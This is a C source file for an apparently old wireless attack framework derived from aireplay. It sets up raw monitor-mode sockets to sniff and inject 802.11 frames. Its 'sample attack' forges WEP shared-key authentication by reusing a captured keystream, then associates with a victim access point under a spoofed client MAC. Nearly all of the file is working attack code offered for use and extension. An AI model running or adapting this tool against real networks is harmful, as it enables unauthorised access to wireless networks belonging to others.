/*
 * k2wrlz framework for sniffing ieee80211 packets
 * and generating deauth packets and sending raw
 * packets.
 * working on all known rfmontx devices
 * Based on C. Devines aireplay, thx!
 */

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>
#include <linux/wireless.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>

#include "pcap.h"
#include "crctable.h"

#define uchar unsigned char

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
}
dev;

unsigned long nb_pkt_sent;
unsigned char tmpbuf[4096];
char strbuf[512];
char athXraw[] = "athXraw";
char mac_p[6] = "\x00\x00\x00\x00\x00\x00";
char *xor;
uchar crc_ret[4];
int prgalen=0;	//Length of PRGA keystream

/* wlanng-aware frame sending routing */

int send_packet( void *buf, size_t count )
{
    int ret;

    if( dev.is_wlanng && count >= 24 )
    {
        /* for some reason, wlan-ng requires a special header */

        if( ( ((unsigned char *) buf)[0] & 3 ) != 3 )
        {
            memcpy( tmpbuf, buf, 24 );
            memset( tmpbuf + 24, 0, 22 );

            tmpbuf[30] = ( count - 24 ) & 0xFF;
            tmpbuf[31] = ( count - 24 ) >> 8;

            memcpy( tmpbuf + 46, buf + 24, count - 24 );

            count += 22;
        }
        else
        {
            memcpy( tmpbuf, buf, 30 );
            memset( tmpbuf + 30, 0, 16 );

            tmpbuf[30] = ( count - 30 ) & 0xFF;
            tmpbuf[31] = ( count - 30 ) >> 8;

            memcpy( tmpbuf + 46, buf + 30, count - 30 );

            count += 16;
        }

        buf = tmpbuf;
    }

    if( ( dev.is_wlanng || dev.is_hostap ) &&
        ( ((uchar *) buf)[1] & 3 ) == 2 )
    {
        unsigned char maddr[6];

        /* Prism2 firmware swaps the dmac and smac in FromDS packets */

        memcpy( maddr, buf + 4, 6 );
        memcpy( buf + 4, buf + 16, 6 );
        memcpy( buf + 16, maddr, 6 );
    }

    ret = write( dev.fd_out, buf, count );

    if( ret < 0 )
    {
        if( errno == EAGAIN || errno == EWOULDBLOCK ||
            errno == ENOBUFS )
        {
            usleep( 10000 );
            return( 0 );
        }

        perror( "write failed" );
        return( -1 );
    }

    nb_pkt_sent++;
    return( 0 );
}

/* madwifi-aware frame reading routing */

int read_packet( void *buf, size_t count )
{
    int caplen, n = 0;

    if( ( caplen = read( dev.fd_in, tmpbuf, count ) ) < 0 )
    {
        if( errno == EAGAIN )
            return( 0 );

        perror( "read failed" );
        return( -1 );
    }

    if( dev.is_madwifi )
        caplen -= 4;    /* remove the FCS */

    memset( buf, 0, sizeof( buf ) );

    if( dev.arptype_in == ARPHRD_IEEE80211_PRISM )
    {
        /* skip the prism header */

        if( tmpbuf[7] == 0x40 )
            n = 64;
        else
            n = *(int *)( tmpbuf + 4 );

        if( n < 8 || n >= caplen )
            return( 0 );
    }

    if( dev.arptype_in == ARPHRD_IEEE80211_FULL )
    {
        /* skip the radiotap header */

        n = *(unsigned short *)( tmpbuf + 2 );

        if( n <= 0 || n >= caplen )
            return( 0 );
    }

    caplen -= n;

    memcpy( buf, tmpbuf + n, caplen );

    return( caplen );
}

/* interface initialization routine */

int openraw( char *iface, int fd, int *arptype )
{
    struct ifreq ifr;
    struct packet_mreq mr;
    struct sockaddr_ll sll;

    /* find the interface index */

    memset( &ifr, 0, sizeof( ifr ) );
    strncpy( ifr.ifr_name, iface, sizeof( ifr.ifr_name ) - 1 );

    if( ioctl( fd, SIOCGIFINDEX, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFINDEX) failed" );
        return( 1 );
    }

    /* bind the raw socket to the interface */

    memset( &sll, 0, sizeof( sll ) );
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;

    if( dev.is_wlanng )
        sll.sll_protocol = htons( ETH_P_80211_RAW );
    else
        sll.sll_protocol = htons( ETH_P_ALL );

    if( bind( fd, (struct sockaddr *) &sll,
              sizeof( sll ) ) < 0 )
    {
        perror( "bind(ETH_P_ALL) failed" );
        return( 1 );
    }

    /* lookup the hardware type */

    if( ioctl( fd, SIOCGIFHWADDR, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFHWADDR) failed" );
        return( 1 );
    }

    if( ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211 &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_PRISM &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_FULL )
    {
        if( ifr.ifr_hwaddr.sa_family == 1 )
            fprintf( stderr, "\nARP linktype is set to 1 (Ethernet) " );
        else
            fprintf( stderr, "\nUnsupported hardware link type %4d ",
                     ifr.ifr_hwaddr.sa_family );

        fprintf( stderr, "- expected ARPHRD_IEEE80211\nor ARPHRD_IEEE8021"
                         "1_PRISM instead.  Make sure RFMON is enabled:\n"
                         "run 'ifconfig %s up; iwconfig %s mode Monitor "
                         "channel <#>'\n\n", iface, iface );
        return( 1 );
    }

    *arptype = ifr.ifr_hwaddr.sa_family;

    /* enable promiscuous mode */

    memset( &mr, 0, sizeof( mr ) );
    mr.mr_ifindex = sll.sll_ifindex;
    mr.mr_type    = PACKET_MR_PROMISC;

    if( setsockopt( fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
                    &mr, sizeof( mr ) ) < 0 )
    {
        perror( "setsockopt(PACKET_MR_PROMISC) failed" );
        return( 1 );
    }

    return( 0 );
}

/* Print packet dump to stdout */

void print_packet ( uchar h80211[], int caplen )
{
	int i,j;

	printf( "        Size: %d, FromDS: %d, ToDS: %d",
		caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

	if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
	{
	if( ( h80211[27] & 0x20 ) == 0 )
		printf( " (WEP)" );
	else
		printf( " (WPA)" );
	}

	for( i = 0; i < caplen; i++ )
	{
	if( ( i & 15 ) == 0 )
	{
		if( i == 224 )
		{
		printf( "\n        --- CUT ---" );
		break;
		}

		printf( "\n        0x%04x:  ", i );
	}

	printf( "%02x", h80211[i] );

	if( ( i & 1 ) != 0 )
		printf( " " );

	if( i == caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
	{
		for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
		{
		printf( "  " );
		if( ( j & 1 ) != 0 )
			printf( " " );
		}

		printf( " " );

		for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 126 )
				? '.' : h80211[i - 15 + j] );
	}

	if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
	{
		printf( " " );

		for( j = 0; j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 127 )
				? '.' : h80211[i - 15 + j] );
	}
	}
	printf("\n");
}

/* MAIN */

int main( int argc, char *argv[] )
{
    int n;

    if( geteuid() != 0 )
    {
        printf( "This program requires root privileges.\n" );
        return( 1 );
    }


    if( argc < 2 )
    {
        printf( "ieee80211rawframework: Need to know your device!\n");
        return( 1 );
    }

    memset( &dev, 0, sizeof( dev ) );

    dev.fd_rtc = -1;

    dev.fd_in = dev.fd_out = (int) argv[1];

    /* create the RAW sockets */

    if( ( dev.fd_in = socket( PF_PACKET, SOCK_RAW,
                              htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        if( getuid() != 0 )
            fprintf( stderr, "This program requires root privileges.\n" );
        return( 1 );
    }

    if( ( dev.fd_out = socket( PF_PACKET, SOCK_RAW,
                               htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        return( 1 );
    }

    /* check if wlan-ng or hostap or r8180 */

    if( strlen( argv[1] ) == 5 &&
        memcmp( argv[1], "wlan", 4 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "wlancfg show %s 2>/dev/null | "
                  "grep p2CnfWEPFlags >/dev/null",
                  argv[1] );

        if( system( strbuf ) == 0 )
            dev.is_wlanng = 1;

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s 2>/dev/null | "
                  "grep antsel_rx >/dev/null",
                  argv[1] );

        if( system( strbuf ) == 0 )
            dev.is_hostap = 1;
    }

    /* enable injection on ralink */

    if( memcmp( argv[1], "ra", 2 ) == 0 ||
        memcmp( argv[1], "rausb", 5 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s rfmontx 1 &>/dev/null",
                  argv[1] );
        system( strbuf );
    }

    /* check if newer athXraw interface available */

    if( strlen( argv[1] ) == 4 &&
        memcmp( argv[1], "ath", 3 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "sysctl -w dev.%s.rawdev=1 &>/dev/null",
                  argv[1] );

        if( system( strbuf ) == 0 )
        {
            athXraw[3] = argv[1][3];

            memset( strbuf, 0, sizeof( strbuf ) );
            snprintf( strbuf,  sizeof( strbuf ) - 1,
                      "ifconfig %s up", athXraw );
            system( strbuf );
            argv[1] = athXraw;
        }
    }

    /* drop privileges */

    setuid( getuid() );

    /* open the replay interface */

    dev.is_madwifi = ( memcmp( argv[1], "ath", 3 ) == 0 );

    if( openraw( argv[1], dev.fd_out, &dev.arptype_out ) != 0 )
        return( 1 );

    dev.fd_in = dev.fd_out;
    dev.arptype_in = dev.arptype_out;

    /*
    * running attack functions
    *
    * insert own attacks here!
    */

    attack(argc, argv);

    return( 0 );
}

char hex2char (char byte1, char byte2)
{
// Very simple routine to convert hexadecimal input into a byte
	char rv;

	if (byte1 == '0') { rv = 0; }
	if (byte1 == '1') { rv = 16; }
	if (byte1 == '2') { rv = 32; }
	if (byte1 == '3') { rv = 48; }
	if (byte1 == '4') { rv = 64; }
	if (byte1 == '5') { rv = 80; }
	if (byte1 == '6') { rv = 96; }
	if (byte1 == '7') { rv = 112; }
	if (byte1 == '8') { rv = 128; }
	if (byte1 == '9') { rv = 144; }
	if (byte1 == 'A' || byte1 == 'a') { rv = 160; }
	if (byte1 == 'B' || byte1 == 'b') { rv = 176; }
	if (byte1 == 'C' || byte1 == 'c') { rv = 192; }
	if (byte1 == 'D' || byte1 == 'd') { rv = 208; }
	if (byte1 == 'E' || byte1 == 'e') { rv = 224; }
	if (byte1 == 'F' || byte1 == 'f') { rv = 240; }

	if (byte2 == '0') { rv += 0; }
	if (byte2 == '1') { rv += 1; }
	if (byte2 == '2') { rv += 2; }
	if (byte2 == '3') { rv += 3; }
	if (byte2 == '4') { rv += 4; }
	if (byte2 == '5') { rv += 5; }
	if (byte2 == '6') { rv += 6; }
	if (byte2 == '7') { rv += 7; }
	if (byte2 == '8') { rv += 8; }
	if (byte2 == '9') { rv += 9; }
	if (byte2 == 'A' || byte2 == 'a') { rv += 10; }
	if (byte2 == 'B' || byte2 == 'b') { rv += 11; }
	if (byte2 == 'C' || byte2 == 'c') { rv += 12; }
	if (byte2 == 'D' || byte2 == 'd') { rv += 13; }
	if (byte2 == 'E' || byte2 == 'e') { rv += 14; }
	if (byte2 == 'F' || byte2 == 'f') { rv += 15; }

	return rv;
}

char *parse_mac(char *input)
{
// Parsing input MAC adresses like 00:00:11:22:aa:BB or 00001122aAbB

    char tmp[12] = "000000000000";
    int t;

    if (input[2] == ':') {
	memcpy(tmp   , input   , 2);
	memcpy(tmp+2 , input+3 , 2);
	memcpy(tmp+4 , input+6 , 2);
	memcpy(tmp+6 , input+9 , 2);
	memcpy(tmp+8 , input+12 , 2);
	memcpy(tmp+10, input+15 , 2);
    } else {
	memcpy(tmp, input, 12);
    }

    for (t=0; t<6; t++) mac_p[t] = hex2char(tmp[2*t], tmp[2*t+1]);

    return mac_p;
}

char *xor_me_baby(char *plain, char *keystream, int len)
{
    int i=0;

    xor = (char*) malloc(len);

    for (i=0; i<len; i++) {
	xor[i] = plain[i] ^ keystream[i];
    }

    return xor;
}

void add_icv(char *input, int len)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = 24; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

int read_prn(unsigned char **dest, char *file)
{
    FILE *f;
    int size;

    if(file == NULL) return( 1 );
    if(*dest == NULL) *dest = (char*) malloc(1501);

    f = fopen(file, "r");

    if(f == NULL)
    {
         printf("Error opening %s\n", file);
         return( 1 );
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    rewind(f);

    if(size > 1500) size = 1500;

    if( fread( (*dest), size, 1, f ) != 1 )
    {
        fprintf( stderr, "fread failed\n" );
        return( 1 );
    }

    prgalen = size;

    fclose(f);
    return( 0 );
}

void wait_for_beacon(uchar *bssid, uchar *capa)
{
    int len = 0;
    uchar pkt_sniff[4096];

    while (1) {
	len = 0;
	while (len < 22) len = read_packet(pkt_sniff, 4096);
	if (! memcmp(pkt_sniff, "\x80", 1)) {
	    if (! memcmp(bssid, pkt_sniff+10, 6)) break;
	}
    }

    memcpy(capa, pkt_sniff+34, 2);

    printf("\nCapability Field from Beacon Frame:\n");
    print_packet(capa, 2);
}

/* Sample Attack */

int attack( int argc, char *argv[] )
{

    int dd = 0;		//Counting authentication tries
    int de = 0;		//Counting association tries
    int iii = 0;	//Counting packets while waiting for responses

    uchar auth1[] =	"\xb0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\xb0\x01\x01\x00\x01\x00\x00\x00";

    uchar auth3[4096] =	"\xb0\x40\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\xc0\x01";
    int auth3len = 0;	//Resulting total size of auth3 packet after encryption

    uchar ack[14] = 	"\xd4";
    memset(ack+1, 0, 13);

    uchar *prga;	//Pointer to the PRGA Keystream
    uchar *cipher;	//Pointer to ciphertext after encryption
    uchar *icv;		//Pointer to ICV

    char sniff[4096];	//Sniff packet with Challenge in it
    int snifflen = 0;
    char sniff2[4096];  //Sniff response packet to check if authentication was successful
    int snifflen2 = 0;

    char cmac[6];	//Fake client MAC
    char vmac[6];	//victim AP MAC

nochmal:

    dd++;
    iii = 0;

    if (argc != 6) {
	printf ("\nUsage: %s <ESSID> <BSSID> <ClientMAC> <PRGAFile>\n", argv[0]);
	return -1;
    }

    //Parsing MAC adresses
    memcpy(cmac, parse_mac(argv[4]), 6);
    memcpy(vmac, parse_mac(argv[3]), 6);

    //Copy them into packet
    memcpy(auth1+4, vmac, 6);
    memcpy(auth1+10,cmac, 6);
    memcpy(auth1+16,vmac, 6);

    //Preparing ACK packet
    memcpy(ack+4, vmac, 6);

    send_packet(auth1, 30);
    send_packet(ack, 14);

    printf("Step1: Auth\n\n");
    print_packet(auth1, 30);

    //Waiting for response packet containing the challenge
    while (1) {
	snifflen = read_packet(sniff, 4096);
	iii++;
	if (sniff[0] == '\xb0') break;
	if (iii == 10) {
	    printf ("\nNot answering...\nRETRYING!\n\n\n");
	    goto nochmal;
	}
    }

    iii = 0;

    printf("\n\nStep2: Response\n\n");
    print_packet(sniff, snifflen);

    if (sniff[28] == '\x0d') {
	printf ("\nAP does not support Shared Key Authentication!\n");
	return -1;
    }

    //Reading Keystream from file
    read_prn(&prga, argv[5]);

    //First 4 Bytes in .xor file are IV + KeyIndex
    uchar *iv = prga;
    //Keystream starts at 5th byte
    prga += 4;
    prgalen -= 4;

    printf("\nIV + KeyIndex used: %02x%02x%02x %02x\n", iv[0], iv[1], iv[2], iv[3]);
    printf("\nPRGA XOR Values used to fake auth:\n");
    print_packet(prga, prgalen);

    if (prgalen < snifflen-24) {
	printf("\n\nPRGA is too short! Need at least %d Bytes, got %d!\n", snifflen-24, prgalen);
	return -1;
    }

    //Increasing SEQ number
    sniff[26]++;
    //Adding ICV checksum
    add_icv(sniff, snifflen);
    //ICV => plus 4 bytes
    snifflen += 4;

    printf("\nPlaintext of packet to be encrypted and sent back:\n");
    print_packet(sniff, snifflen);

    //Encrypting
    cipher = xor_me_baby(sniff+24, prga, snifflen-24);

    //Set the MAC adresses
    memcpy(auth3+4, vmac, 6);
    memcpy(auth3+10,cmac, 6);
    memcpy(auth3+16,vmac, 6);

    //Calculating size of encrypted packet
    auth3len = snifflen+4; //Encrypted packet has IV+KeyIndex, thus 4 bytes longer than plaintext with ICV

    //Copy IV and ciphertext into packet
    memcpy(auth3+24,    iv,       4);
    memcpy(auth3+28,cipher,auth3len);


    printf("\n\nStep 3: Sending packet with encrypted challenge:\n");
    print_packet(auth3, auth3len);

    send_packet(auth3, auth3len);
    send_packet(ack, 14);

    //Waiting for successful authentication
    while (1) {
	snifflen2 = read_packet(sniff2, 4096);
	iii++;
	if ((sniff2[0] == '\xb0') && (snifflen2 < 60)) break;
	if (iii == 10) {
	    printf ("\nNot answering...\nRETRYING!\n\n\n");
	    goto nochmal;
	}
    }

    printf("\n\nStep 4: Answer packet:\n");
    print_packet(sniff2, snifflen2);

    if (!memcmp(sniff2+24, "\x01\x00\x04\x00\x00\x00", 6)) {
	printf ("\nCode 0 - Authentication SUCCESSFUL after trying %d times to authenticate :)\n", dd);
    } else { 
	printf ("\nAuthentication failed!\nRETRYING!\n\n\n");
	goto nochmal;
    }

    //
    //
    // ### ### ### ASSOCIATION ### ### ###
    //
    //

nochmal_assoc:

    de++;

    uchar assoc[4096] =	"\x00\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
			"\x00\x00\x00\x00\x00\x00\xd0\x01\x15\x00\x0a\x00\x00";

    uchar rates[16] = 	"\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C";

    uchar *capa;	//Capability Field from beacon
    capa = (uchar *) malloc(2);

    char sniff3[4096];  //Sniff response packet to check if association was successful
    int snifflen3 = 0;

    //Copying MAC adresses into frame
    memcpy(assoc+4 ,vmac,6);
    memcpy(assoc+10,cmac,6);
    memcpy(assoc+16,vmac,6);

    //Getting ESSID length
    int slen = strlen(argv[2]);

    //Set tag length
    assoc[29] = (uchar) slen;
    //Set ESSID tag
    memcpy(assoc+30,argv[2],slen);
    //Set Rates tag
    memcpy(assoc+30+slen, rates, 16);

    //Calculating total packet size
    int assoclen = 30 + slen + 16;

    wait_for_beacon(vmac, capa);
    memcpy(assoc+24, capa, 2);

    printf("\n\nStep 5: Sending association request:\n");
    print_packet(assoc, assoclen);

    send_packet(assoc, assoclen);
    send_packet(ack, 14);

    iii = 0;

    while (1) {
	snifflen3 = read_packet(sniff3, 4096);
	iii++;
	if (sniff3[0] == '\x10') break;
	if (iii == 10) {
	    printf ("\nNot answering...\nRETRYING!\n\n\n");
	    goto nochmal;
	}
    }

    printf("\n\nStep 6: Association Response:\n");
    print_packet(sniff3, snifflen3);

    if (!memcmp(sniff3+26, "\x00\x00", 2)) {
	printf ("\nCode 0 - Association SUCCESSFUL after trying %d times to authenticate and %d times to associate:)\n", dd, de);
    } else {
	if (de > 50) {
	    printf("\nAssociation failed more than 50 times, trying to authenticate again...\n\n\n");
	    de = 0;
	    dd = 0;
	    goto nochmal;
	} else {
	    printf ("\nAssociation failed!\nRETRYING!\n\n\n");
	    goto nochmal_assoc;
	}
    }
}
